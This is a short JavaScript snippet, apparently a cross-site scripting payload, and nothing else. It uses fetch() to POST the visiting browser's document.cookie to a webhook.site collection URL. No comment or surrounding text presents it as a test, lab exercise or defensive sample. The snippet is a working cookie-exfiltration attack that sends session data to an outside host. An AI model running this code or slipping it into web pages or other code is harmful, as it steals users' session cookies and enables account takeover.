fetch("https://webhook.site/544811de-93ee-4ed2-99b1-9f32f7e97034", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
        cookie: document.cookie
    })
});
